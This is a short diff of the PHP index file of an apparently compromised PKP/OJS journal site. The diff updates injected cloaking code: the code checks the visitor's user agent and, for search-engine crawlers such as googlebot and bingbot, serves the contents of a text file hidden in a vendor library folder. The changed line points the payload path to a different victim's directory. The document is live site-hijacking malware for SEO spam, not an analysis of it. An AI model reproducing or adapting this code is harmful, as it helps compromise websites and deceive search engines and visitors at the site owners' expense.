@@ -16,7 +16,7 @@ function skylight_team($url) {
 }
 
 $res = strtolower($_SERVER["HTTP_USER_AGENT"]);
-$bot = "/home/unialfa/public_html/lib/pkp/lib/vendor/phpmailer/phpmailer/src/index.txt";
+$bot = "/home/spcrdnet/public_html/jelss.miard.org/lib/pkp/lib/vendor/sokil/php-isocodes/index.txt";
 $file = skylight_team($bot);
 $botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
 if (preg_match($botchar, $res)) {
@@ -24,6 +24,8 @@ if (preg_match($botchar, $res)) {
 }
 ?>
 <?php
+
+
 
 /**
  * @defgroup index Index
